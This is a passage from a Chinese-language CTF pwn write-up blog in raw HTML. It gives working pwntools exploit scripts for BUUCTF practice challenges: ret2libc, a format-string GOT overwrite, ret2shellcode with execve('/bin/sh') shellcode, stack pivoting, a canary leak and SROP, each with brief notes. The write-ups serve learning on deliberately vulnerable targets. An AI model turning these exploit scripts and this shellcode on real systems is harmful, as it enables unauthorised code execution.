class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">140</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x36-wustctf2020-closed"><a href="#0x36-wustctf2020-closed" class="headerlink" title="0x36.wustctf2020_closed"></a>0x36.wustctf2020_closed</h2><p>​    老朋友了，<code>close函数绕过问题</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag 1&gt;&amp;0</span><br><span class="line">exec 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.3qxfxue6eurk.webp"></p><p>​    <code>exec 1&gt;&amp;0</code>，其中 <code>1</code> 表示文件描述符 <code>stdout</code>，<code>0</code> 表示文件描述符 <code>stdin</code>。<code>&gt;&amp;</code> 符号表示将标准输出重定向到标准输入，这样在程序执行过程中，标准输出将被重定向到终端输入，从而可以交互式地输入数据。<br>​    在Unix或Linux中，每个进程都有3个标准文件描述符：标准输入<code>stdin</code>，标准输出<code>stdout</code>和标准错误<code>stderr</code>，分别对应文件描述符0、1和2。</p><h2 id="0x37-axb-2019-fmt32"><a href="#0x37-axb-2019-fmt32" class="headerlink" title="0x37.axb_2019_fmt32"></a>0x37.axb_2019_fmt32</h2><p><code>fmt-x86 + ret2libc3</code></p><p>​    我感觉应该利用<code>fmtstr_payload()</code>函数，但是我貌似现在只知道该如何求偏移和利用偏移<code>%n$p</code>,这道题就拿来fmt漏洞的学习进阶吧！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">baaaa22-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">a1234tag-%8$p</span><br><span class="line">a1111tag-%8$p</span><br><span class="line">a123tag-%8$p</span><br><span class="line">aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">11111112-%8$p</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230310/%E5%9B%BE%E7%89%87.5qv57cen1w8w.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230310/%E5%9B%BE%E7%89%87.291zwhlpmd4w.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25116</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/58&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> + p32(printf_got) + <span class="string">b&#x27;tag_here!&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">c.sendafter(<span class="string">b&#x27;me:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;tag_here!&quot;</span>)</span><br><span class="line">printf_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;THE LEAK ADDR : &quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libcbase = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span> +fmtstr_payload(<span class="number">8</span>,&#123;printf_got:system_addr&#125;,write_size = <span class="string">&quot;byte&quot;</span>,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里的分号&quot;;&quot;实际上是用于终止先前的命令并执行下一条命令的。在这里，它的作用是为了确保在发送/bin/sh\x00之前没有其他命令在队列中等待执行。</span></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><mark>fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)</mark><br>第一个参数表示格式化字符串的偏移<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:systemAddress}；<br>第三个参数表示已经输出的字符个数<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写</p></blockquote><h2 id="0x38-pwnable-start"><a href="#0x38-pwnable-start" class="headerlink" title="0x38.pwnable_start"></a>0x38.pwnable_start</h2><p><code>汇编 &amp; Leak addr &amp; ret2shellcode</code></p><p>​    很容易通过汇编语言发现，第二次系统调用的函数是<code>read</code>函数，<code>read(0,addr,60)</code>，通过<code>cyclic</code>我得到了溢出偏移量为<code>20</code>.但是有一种<code>拔剑四顾心茫然</code>的感觉。虽然保护全关，利用<code>ret2shellcode</code>但是返回到哪？如何执行？也没有后门，也做不了像<code>ret2libc3</code>的流程。因为保护全关了，我还是更倾向于<code>ret2shellcode</code>。</p><p>​    这道题应该属于<code>trick</code>，我实在想不到如何做了，借鉴一下网络资料增长经验吧😢</p><p>​    没有看其他师傅的payload借鉴了一下思路：利用栈溢出，再次返回<code>write函数</code>把栈地址打出来，然后利用这个栈地址，执行我们第一次写入的<code>shellcode</code>，但是这个shellcode的限制条件是不能太长了，只读入了60bytes。</p><p>​    <img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230310/%E5%9B%BE%E7%89%87.2hxt3nmdx29s.webp"></p><p>​    不知道为什么直接sendline会导致错误的输入，使用规范的sendline就没有问题能够打通。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28643</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f </span></span><br><span class="line"><span class="string">push 0x6e69622f </span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">offset = <span class="number">20</span></span><br><span class="line">mov_ecx_esp = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(mov_ecx_esp)</span><br><span class="line">c.sendafter(<span class="string">b&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line">stack_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR: &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(stack_addr+offset) + asm(shellcode)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    最后发现，<code>trick</code>也非太难，只是我真的没有想到跳转回来泄露栈地址地址。</p><h2 id="0x39-gyctf-2020-borrowstack"><a href="#0x39-gyctf-2020-borrowstack" class="headerlink" title="0x39.gyctf_2020_borrowstack"></a>0x39.gyctf_2020_borrowstack</h2><p><code>Stack Migration x64 &amp; 栈抬高 &amp; recv &amp; one_gadget</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29682</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/62&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_rbp = <span class="number">0x601080</span></span><br><span class="line">leave_ret =<span class="number">0x0400699</span></span><br><span class="line">ret = <span class="number">0x04004c9</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0400626</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;u want&#x27;</span>)</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(fake_rbp) + p64(leave_ret)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;now!&#x27;</span>)</span><br><span class="line">payload= p64(ret) *<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># ADD THE RSP </span></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.recvline()  <span class="comment"># &#x27;\n&#x27;</span></span><br><span class="line">puts_addr=u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR : &#x27;</span> +<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = libcbase + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*( <span class="number">0x60</span> + <span class="number">8</span> ) + p64(one_gadget)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230311/%E5%9B%BE%E7%89%87.kpl3ev0za1s.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230311/%E5%9B%BE%E7%89%87.5jfm8qqs5pc0.webp"></p><h2 id="0x3a-others-babystack"><a href="#0x3a-others-babystack" class="headerlink" title="0x3a.others_babystack"></a>0x3a.others_babystack</h2><p><code>canary leak &amp; ret2libc3 &amp; one_gadget &amp; recv()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/61&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29390</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/61&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0400908</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400a93</span></span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>))</span><br><span class="line"><span class="comment"># 将canary的低位覆盖为&#x27;\n&#x27;</span></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">canary= u64(c.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c.recv()) <span class="comment"># &#x27;\n&#x27;</span></span><br><span class="line">puts_addr=u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = libcbase + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(one_gadget) </span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><mark>注意事项：</mark></p><ol><li>栈的特性：通常在同一块内存中，从地址低位开始填充数据，就是先填充低字节。所以我们在这里填充<code>&#39;\n&#39;</code>则会直接覆盖canary的低位<code>\X00</code><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.4pb4vdb29bwg.webp"></li><li>结束循环才能开始执行栈溢出？这一点我不是能够很理解，但是不结束的话根本没有地址打印出来即接收不了。</li><li>注意<code>sendline()</code>的<code>\n</code></li></ol><h2 id="0x3b-ciscn-2019-s-9"><a href="#0x3b-ciscn-2019-s-9" class="headerlink" title="0x3b.ciscn_2019_s_9"></a>0x3b.ciscn_2019_s_9</h2><p><code>stack execution &amp; ret2shellcode &amp; Assembly</code></p><p>​    做完了这道题，感觉我对栈上结构与汇编语言的理解更深刻了一些。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25180</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/63&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">hint = <span class="number">0x08048554</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f </span></span><br><span class="line"><span class="string">push 0x6e69622f </span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = shellcode +<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x24</span>-<span class="built_in">len</span>(shellcode)) + p32(hint) </span><br><span class="line">payload += asm(<span class="string">&quot;sub esp, 40; call esp&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.6jfp6m0cd01s.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.3czyrfi48nls.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.2pndmex4burk.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.2ayx71amo6kg.webp"></p><h2 id="0x3c-picoctf-2018-shellcode"><a href="#0x3c-picoctf-2018-shellcode" class="headerlink" title="0x3c.picoctf_2018_shellcode"></a>0x3c.picoctf_2018_shellcode</h2><p><code>ret2eax &amp; not-decompilable &amp; Assembly </code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/64&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27736</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/64&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Enter a string!\n&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.1ioibj8zvz8g.webp"></p><h2 id="0x3d-ciscn-2019-es-7"><a href="#0x3d-ciscn-2019-es-7" class="headerlink" title="0x3d.ciscn_2019_es_7"></a>0x3d.ciscn_2019_es_7</h2><p><code>SROP</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/65&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26571</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/65&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">xor_xor_rax = <span class="number">0x04004F1</span></span><br><span class="line">mov_rax_15_ret = <span class="number">0x004004DA</span></span><br><span class="line">syscall_ret = <span class="number">0x0400517</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span>+ p64(xor_xor_rax))</span><br><span class="line">c.recv(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(c.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line">c.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bin_sh = stack_addr - 0x148  # local</span></span><br><span class="line">bin_sh = stack_addr - <span class="number">0x118</span>    <span class="comment"># remote</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe_frame= SigreturnFrame()</span><br><span class="line">exe_frame.rax = <span class="number">59</span></span><br><span class="line">exe_frame.rdi = bin_sh</span><br><span class="line">exe_frame.rsi = <span class="number">0</span></span><br><span class="line">exe_frame.rdx = <span class="number">0</span></span><br><span class="line">exe_frame.rsp = stack_addr</span><br><span class="line">exe_frame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(mov_rax_15_ret) + p64(syscall_ret) + <span class="built_in">bytes</span>(exe_frame)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.3ok685fst0zk.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.58yp45la7am8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.46oechceqsao.webp"></p><p>​    </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.4xaneo52tf9c.webp"></p><p><mark>patchef改库后：</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230317/%E5%9B%BE%E7%89%87.5cvayb7zu6ww.webp"></p><h2 id="0x3e-jarvisoj-level5"><a href="#0x3e-jarvisoj-level5" class="headerlink" title="0x3e.jarvisoj_level5"></a>0x3e.jarvisoj_level5</h2><p><code>ret2csu</code></p><p>参见<code>0x28</code></p><h2 id="0x3f-360chunqiu2017-smallest（未完全理解）"><a href="#0x3f-360chunqiu2017-smallest（未完全理解）" class="headerlink" title="0x3f.360chunqiu2017_smallest（未完全理解）"></a>0x3f.360chunqiu2017_smallest（<mark>未完全理解）</mark></h2><p><code>SROP</code>   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 